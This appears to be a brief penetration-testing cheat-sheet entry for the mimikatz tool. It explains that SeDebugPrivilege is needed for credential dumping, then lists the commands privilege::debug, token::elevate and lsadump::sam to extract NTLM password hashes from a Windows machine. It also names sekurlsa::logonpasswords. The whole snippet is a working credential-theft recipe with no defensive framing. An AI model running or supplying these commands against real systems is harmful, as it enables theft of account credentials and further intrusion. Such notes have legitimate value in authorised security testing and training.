
To use *sekurlsa::logonpasswords* or *lsadump::sam* we need **SeDebugPrivilege** use this to enable it.

```console
mimikatz # privilege::debug
```

```console
mimikatz # token::elevate
```
If the previous two were successfull, now we can get NTLM hashes for users with this.

```console
lsadump::sam
```
